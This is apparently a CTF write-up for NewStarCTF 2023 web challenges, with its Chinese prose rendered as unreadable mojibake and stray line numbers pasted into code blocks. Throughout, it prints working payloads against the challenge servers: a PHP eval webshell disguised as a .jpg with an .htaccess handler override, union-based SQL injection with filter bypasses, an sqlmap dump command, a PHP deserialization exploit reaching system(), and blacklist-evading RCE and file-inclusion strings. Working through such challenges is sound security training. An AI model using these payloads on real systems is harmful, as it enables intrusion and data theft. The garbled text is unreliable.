## WEEK1

### æ³„æ¼çš„ç§˜å¯†(å¤‡ä»½æ³„éœ²)

æ‰“å¼€é¢˜ç›®ï¼Œæç¤ºæœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/555c7abe6e63481dabcfbb6797def5dd.png)ç›´æ¥æ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°æœ‰`./www.zip`
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/894d82a9b9f849e6a0184fa07d439f54.png)
 è®¿é—®ç„¶åä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹åˆ°æ¡Œé¢
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/9e551f76863546459f74033848728dd3.png)

æºç å’Œrobots.txtåˆ†åˆ«æ˜¯ä¸¤éƒ¨åˆ†flag

### Begin of Uploadï¼ˆä¸Šä¼ ï¼Œåç¼€æ£€æµ‹ï¼‰

å³é”®çœ‹ä¸‹æºç ï¼Œå‘ç°å¯¹ä¸Šä¼ æ–‡ä»¶åç¼€åæœ‰æ£€æµ‹
 è¿™é‡Œçš„æ£€æµ‹æ˜¯åç¼€ååªéœ€è¦å‡ºç°åˆæ³•çš„å°±è¡Œ
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/cb62aca4e0af4d1e957c7563936eb715.png)æˆ‘ä»¬ä¸Šä¼ 1.jpgçš„[ä¸€å¥è¯æœ¨é©¬](https://so.csdn.net/so/search?q=ä¸€å¥è¯æœ¨é©¬&spm=1001.2101.3001.7020)
 ç„¶åæŠ“åŒ…ä¿®æ”¹[æ–‡ä»¶å](https://so.csdn.net/so/search?q=æ–‡ä»¶å&spm=1001.2101.3001.7020)ä¸º`1.jpg.php`
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/76d13caf573d4d03b584b69513296be8.png)ä¸Šä¼ æˆåŠŸï¼Œç„¶åå‘½ä»¤æ‰§è¡Œå¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/471c59503dcf44b49b4e9a683c4b8551.png)

### Begin of HTTP

æ‰“å¼€é¢˜ç›®ï¼ŒæŒ‰ç…§è¦æ±‚ä¸€æ­¥æ­¥æ¥
 å…ˆæ˜¯GETä¼ å‚ï¼Œéšä¾¿ç»™ä¸ªå€¼
 ç„¶åæ˜¯POSTä¼ å‚ï¼Œå‚æ•°å€¼è—åœ¨æºç å¤„
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/ba720d817fb041f4991f0d6842bfe1d5.png)ç„¶ååˆ†åˆ«æ˜¯ä¿®æ”¹cookieä¸ºctferï¼›ä¿®æ”¹æµè§ˆå™¨ä¸ºNewStarCTF2023ï¼›ä¿®æ”¹Refererä¸ºnewstarctf.com
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/db12d04a7f4e425f97bf3e4c253562e1.png)
 æœ€åä¸€æ­¥åªèƒ½bpæŠ“åŒ…ä¿®æ”¹ä¸º127.0.0.1
 ï¼ˆè¿™é‡Œç”¨XFFä¸è¡Œï¼Œæˆ‘ç”¨çš„æ˜¯X-Real-IPï¼‰
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/ad8668b3000f4b05a97bb23b85b81f53.png)

### ErrorFlaskï¼ˆflaskæŠ¥é”™ï¼‰

æ‰“å¼€é¢˜ç›®ï¼Œæç¤ºæˆ‘ä»¬ä¼ å‚ä¸¤ä¸ªæ•°ï¼Œç„¶åå¸®æˆ‘ä»¬è®¡ç®—
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/08c85b2dc28b4d0ea2c9054b79943702.png)æˆ‘ä»¬éšä¾¿ä¼ ä¸¤ä¸ªæ•°
 å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯sstiï¼Œåé¢è¿˜æœ‰è®¡ç®—ç»“æœ
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/ef69fe3fc5ec42fb9a6277051ec881e3.png)æç¤ºflagåœ¨æºç 
 æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å…¶ä¸­ä¸€ä¸ªä¸ºå­—æ¯ï¼Œè®©å…¶å‡ºç°æŠ¥é”™
 æœç„¶å‡ºç°äº†`/app/app.py`æºç ï¼Œå¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/dcd7e65e548a4516bda61889bb3ca433.png)

### Begin of PHPï¼ˆphpå¼±ç±»å‹ã€extractå˜é‡è¦†ç›–é›†åˆï¼‰

æºç 

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
} 

```

åˆ†æä¸€ä¸‹

```php
1. level 1åˆ©ç”¨å¼±æ¯”è¾ƒmd5å€¼ç›¸ç­‰
2. level 2åˆ©ç”¨MD5å’Œsha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œè¿›è¡Œæ•°ç»„ç»•è¿‡
3. level 3åŒæ ·åˆ©ç”¨æ•°ç»„ç»•è¿‡
4. level 4åˆ©ç”¨phpå¼±ç±»å‹æ¯”è¾ƒ
5. level 5åˆ™æ˜¯åˆ©ç”¨key3æ•°ç»„ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼›åˆ©ç”¨extract()å‡½æ•°çš„å˜é‡è¦†ç›–æ¼æ´ï¼Œä¼ å…¥éç©ºå­—ç¬¦å³å¯
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/1257b10d33274311aa4a47d4176415f8.png)

### R!C!E!(phpå‚æ•°ä¼ é€’è§£æç‰¹æ€§ï¼ŒMD5çˆ†ç ´ï¼Œåå¼•å·å‘½ä»¤æ‰§è¡Œ)

æºç 

```php
 <?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
} 
1234567891011
```

åˆ†æä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªifè¯­å¥åˆ¤æ–­æ¡ä»¶ä¸ºä¸Šä¼ çš„passwordå‚æ•°çš„MD5å€¼å‰å…­ä½ä¸ºc4d038ï¼›ç¬¬äºŒä¸ªifè¯­å¥æ˜¯PHPå˜é‡åè§£æç‰¹æ€§å’Œç®€å•çš„å‘½ä»¤æ‰§è¡Œè¿‡æ»¤
 é¦–å…ˆåˆ©ç”¨è„šæœ¬çˆ†ç ´å‡ºè¯¥æ•°

```php
import hashlib

prefix = "c4d038"  # ç›®æ ‡MD5å€¼çš„å‰å…­ä½
prefix_bytes = prefix.encode()  # å°†å‰ç¼€è½¬æ¢ä¸ºå­—èŠ‚ä¸²

for i in range(100000000):
    b = i.to_bytes(22, 'big')
    m = hashlib.md5(str(i).encode()).hexdigest()
    
    if m.startswith(prefix):
        print(i)
        print(m)
        break
```

çˆ†å‡ºæ¥ä¸º114514
 ç„¶åæ˜¯åˆ©ç”¨phpçš„è§£æç‰¹æ€§ï¼Œ`[`ä¼šè¢«è§£ææˆä¸‹åˆ’çº¿`_`ï¼›å½“ç”¨"["æ¥è§£æä¸º" _ "å åé¢çš„"."æ˜¯ä¸ä¼šè¢«è½¬æˆ"_"çš„ (å½“çŸ¥è¯†ç‚¹è®°ä½å¾—äº†)ï¼Œå’Œåå¼•å·å»ç»•è¿‡å¯¹systemå‡½æ•°çš„è¿‡æ»¤ï¼Œåæ–œæ ç»•è¿‡flagï¼Œtacæ›¿æ¢catå‘½ä»¤
 payload

```
password=114514&e[v.a.l=echo `tac /fla\g`;
1
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/ded18d369d60429f9fbeba7e070284f2.png)

### EasyLoginï¼ˆçˆ†ç ´ï¼Œ302è·³è½¬æŠ“åŒ…ï¼‰

æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ç™»å½•æ¡†ï¼Œå°è¯•æ³¨å†Œadmin
 å‘ç°ç”¨æˆ·å·²å­˜åœ¨
 æˆ‘ä»¬éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ä¸ºhackerï¼Œå¯†ç ä¸º123456
 ç™»å½•å¹¶æŠ“åŒ…ï¼Œå‘ç°å¯†ç æ˜¯MD5åŠ å¯†çš„
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/263f11d5b197466c8e5eb172d8dd6372.png)ç„¶åæ”¾è¡Œï¼Œå‘ç°ä¸­é€”è·³è½¬ä¸€ä¸ªphpç•Œé¢
 æˆ‘ä»¬ä¸¢åˆ°é‡æ”¾å™¨ï¼Œå‘ç°æ˜¯é¡µé¢302çŠ¶æ€ï¼Œå¹¶ä¸”å‡ºç°äº†æç¤º
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/89c3ce429d574d308a61edda312eb117.png)
 æˆ‘è¿™é‡Œå› ä¸ºç‰ˆæœ¬é—®é¢˜ï¼Œæˆ‘ä¿å­˜ä¸‹æ¥ç”¨vscodeæ‰“å¼€
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5d204aeaa0404b36a68b25e5e205b4c3.png)æŒ‰ç…§æç¤ºï¼Œæœç„¶æ²¡æœ‰ç¬¬ä¸ƒè¡Œï¼ˆæˆåŠŸè¢«éª—ï¼‰
 ç»“åˆå‰é¢è§£é¢˜æ€è·¯ï¼Œè€è€å®å®çˆ†ç ´å¯†ç 

æ‰“å¼€bpï¼Œpayloadå¤„ç†ä¿®æ”¹ä¸€ä¸‹
 çˆ†å‡ºå¯¹åº”çš„MD5å€¼ï¼Œä¸¢åˆ°åœ¨çº¿ç½‘ç«™å¾—åˆ°å¯†ç ä¸º000000
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/5be20ece53284c6f80613920d06d94d8.png)

ç„¶åå°±æ˜¯ç™»å½•è¿›å…¥ç»ˆç«¯
 ctrl+cç„¶åctrl+dé€€å‡ºæ‰§è¡Œçš„ç¨‹åºchat
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/dd7fe61e3f0449448d8445f94d257f51.png)
 æ²¡ä»€ä¹ˆå‘ç°ï¼Œæˆ‘ä»¬åˆšåˆšåœ¨ç™»é™†æŠ“åŒ…å·²ç»çŸ¥é“ä¸­é€”ä¼šè·³è½¬
 åŒæ ·è¯•è¯•
 ç»“æœæˆåŠŸæŠ“åˆ°è¿™ä¸ªé‡å®šå‘çš„phpé¡µé¢
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/96da58937f0e460ab4a89162b2a3cfb6.png)å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/43ff1618e8f54c628e1f7a2bbe771c62.png)

## WEEK2

### æ¸¸æˆé«˜æ‰‹ï¼ˆjsæ¸¸æˆï¼Œæ§åˆ¶å°ä½œå¼Šï¼‰

æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯å°æ¸¸æˆï¼ˆé¢˜ç›®è·Ÿæœ€è¿‘æ‰“çš„SHCTFæ¯”è¾ƒåƒï¼‰
 æŸ¥çœ‹ä¸‹jsä»£ç 
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/27189da1b0de4ee0a62dfa175862776c.png)å‘ç°è·å¾—èƒœåˆ©çš„æ¡ä»¶æ˜¯åˆ†æ•°å¤§äº100000
 æˆ‘ä»¬åœ¨æ§åˆ¶å°è¾“å…¥ä¸‹é¢è¯­å¥

```
var gameScore = 10000000;
gameover(); 
```

å›è½¦ç„¶åå¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/1c36fa3443694d5d9846b5a1e3062438.png)

### include 0ã€‚0(php://filterä¼ªåè®®è¯»å–æºç )

æºç 

```php
 <?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> 
```

ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Œè¿™é‡Œè¿‡æ»¤äº†å¸¸è§çš„è½¬æ¢è¿‡æ»¤å™¨baseå’Œrot
 æˆ‘ä»¬å¯ä»¥ç”¨`convert.iconv.UTF-8.UTF-16`ï¼Œåº”è¯¥ä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼ˆæ›´æ­£ï¼Œæ²¡æ³•ï¼Œ/iï¼‰
 payload

```
?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php
```

å¾—åˆ°flag

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/4ed2fd1d6edd4fa4800dc7c31a103e8c.png)

### ez_sql

sqlmapä¸€æŠŠæ¢­ï¼š

```cmd
sqlmap -u "http://2f4731e1-05d8-4b79-9b94-0870a1353852.node4.buuoj.cn:81/?id=TMP0919" -D ctf -T here_is_flag -C flag --dump
```

è¿›æ¥éšä¾¿ç‚¹ä¸€ä¸ªï¼Œå‘ç°æœ‰å‚æ•°id
 æˆ‘ä»¬å…ˆfuzzæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤äº†ä»€ä¹ˆ
 æŠ“åŒ…ï¼Œéšä¾¿ç”¨ä¸€ä¸ªå­—å…¸
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/917b219c613f40b4a7f15ea315cf7370.png)
 å‘ç°selectè¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨å¤§å°å†™ç»•è¿‡

é¦–å…ˆçˆ†ä¸€ä¸‹å­—æ®µæ•°

```
?id=-1' union SelECt 1,2,3,4,5 --+
```

å‘ç°å­—æ®µæ•°ä¸º5
 çˆ†åº“å

```
?id=-1' union SelECt database(),2,3,4,5 --+
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/727527fa76d94bfb8edd8e6c81f429a9.png)

ç„¶åç»è¿‡å†æ¬¡æµ‹è¯•ï¼Œå‘ç°`information_schema.tables`å’Œ`where`éƒ½è¢«è¿‡æ»¤äº†
 è¿™é‡Œç”¨`mysql.innodb_table_stats`å’Œ`wHere`ä»£æ›¿
 ï¼ˆå¤šæ¬¡å°è¯•ï¼Œå‘ç°å›æ˜¾çš„ä½ç½®åœ¨5è€Œä¸æ˜¯1ï¼Œå¼€å§‹å¡äº†å¾ˆä¹…æ²¡å›æ˜¾ï¼‰
 çˆ†è¡¨å

```
?id=-1' union SelECt 1,2,3,4,group_concat(table_name) from mysql.innodb_table_stats wHere '1 --+
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/590aa272a9ec4554a7de722cefe6a49f.png)

å› ä¸ºæˆ‘ä»¬ç”¨çš„æ˜¯`mysql.innodb_table_stats`ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥åˆ°åˆ—å
 æ‰€ä»¥ç»§ç»­ç”¨æ— åˆ—åæ³¨å…¥

```
?id=-1' union SelECt 1,2,3,4,group_concat(`1`) from (SelECt 1 union SelECt * from ctf.here_is_flag)a wHere '1 --+
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/e5b4102c110a4b109cfca0ecfe8a6c8e.png)

### Unserializeï¼Ÿ

æºç 

```php
 <?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?> 
```

ç”±äºæ˜¯privateæˆå‘˜å˜é‡ï¼Œæ‰€ä»¥åºåˆ—åŒ–åé•¿åº¦ä¼šåŠ 2ï¼Œå¤šä¸¤ä¸ªç©ºç™½ç¬¦
 exp

```php
<?php
class evil {
    private $cmd;
    function __construct($cmd1){
        $this->cmd=$cmd1;
    }
}

$a=new evil('ls /');
echo serialize($a);
?> 
```

æ‰‹åŠ¨æ·»åŠ %00
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/77f5e3483024492692328967c560c649.png)å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/6f484f2d9d864c239d17731899501e3d.png)

### Upload again!ï¼ˆhtmlå‹phpä¸€å¥è¯ï¼Œ.htaccessï¼‰

æ‰“å¼€é¢˜ç›®
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/3c4623e1c0ea4d2092a3e436b7a8b78d.png)å…ˆä¸Šä¼ æœ€æ™®é€šçš„é©¬`1.php`ï¼Œå‘ç°è¢«æ£€æµ‹äº†
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/22c2a9f0609e49adbd5c8fff823fa0f3.png)

æˆ‘ä»¬å°è¯•ä¿®æ”¹ä¸‹åç¼€ä¸º`.jpg`ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œ

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/404b1c73e4444c2ba043a96f97c5fc81.png)

åœ¨åé¢å°è¯•ä¿®æ”¹MIMEä»¥åŠæ–‡ä»¶å¤´ï¼Œéƒ½ä¸èƒ½ç»•è¿‡
 çŒœæµ‹æ˜¯å¯¹ä¸€å¥è¯æœ¨é©¬çš„`<?`è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¿®æ”¹ä¸ºjsé©¬

```
<script language="php">eval($_POST['shell']);</script>
```

å‘ç°å¯ä»¥ä¸Šä¼ ï¼Œä¸è¿‡æ²¡æœ‰è¢«è§£ææˆphp

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/16220666e40b46baa3c6433a4a3c7d09.png)
 é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨`.htaccess`é…ç½®æ–‡ä»¶æ”»å‡»ï¼Œè®©jpgæ–‡ä»¶è¢«è§£ææˆphp
 é¦–å…ˆåˆ›å»º`.htaccessæ–‡ä»¶`ï¼Œå†™å…¥

```
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

ä¸Šä¼ æˆåŠŸåï¼Œä¸Šä¼ åä¸º`1.jpg`çš„jsé©¬

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/abd1ca92c8224401a0ca0e154bd504c0.png)å‘½ä»¤æ‰§è¡Œä¸€ä¸‹
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5057de5505eb4a1690b8d5783289aba1.png)å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/85c2fb372069492dac1f51c130b51211.png)

### R!!C!!E!!ï¼ˆæ— å‚æ•°RCEï¼‰

æ‰“å¼€é¢˜ç›®ï¼Œæç¤ºæœ‰ä¿¡æ¯æ³„éœ²
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/64d9451c37bd457fbfec9f8d4e73a90a.png)
 è¿™é‡Œæˆ‘æ˜¯dirsearchæ‰«äº†ä¸€ä¸‹ç›®å½•ï¼ˆæ‰«äº†å¾ˆä¹…ï¼‰
 æ‰«å®Œåç¿»ç¿»å‘ç°æœ‰gitæ³„éœ²
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/fa5dd75b43724de1af5033437318d339.png)ç›´æ¥ç”¨å·¥å…·
 å…ˆè¿è¡Œå·¥å…·ï¼Œç„¶åè®¿é—®`./.git/`
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/%25E9%25A2%2598%25E7%259B%25AEwp+%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583%25E6%25B8%2597%25E9%2580%258Fwp/assets/5d1a33455dd24a0483cdff2c5bd92add.png)æºç å¦‚ä¸‹

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

ä¸€çœ¼æ— å‚RCEï¼Œç„¶åè¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°
 è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯`getallheaders()å‡½æ•°`
 æˆ‘ä»¬å…ˆçœ‹çœ‹httpå¤´éƒ¨ä¿¡æ¯

```
?star=print_r(getallheaders());
```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/fe3d12f1ff3b4109bbd50d0aa2793737.png)ç„¶åæˆ‘ä»¬é€‰æ‹©æ·»åŠ å‘½ä»¤åœ¨User-Agenté‚£é‡Œ
 payload

```
?star=eval(next(getallheaders()));
```

å¾—åˆ°flag
 ![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](assets/6872e73be191476dbe72c14889262804.png)

## WEEK3

### Include ğŸï¼ˆpearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰

æºç 

```php
 <?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?> 
```

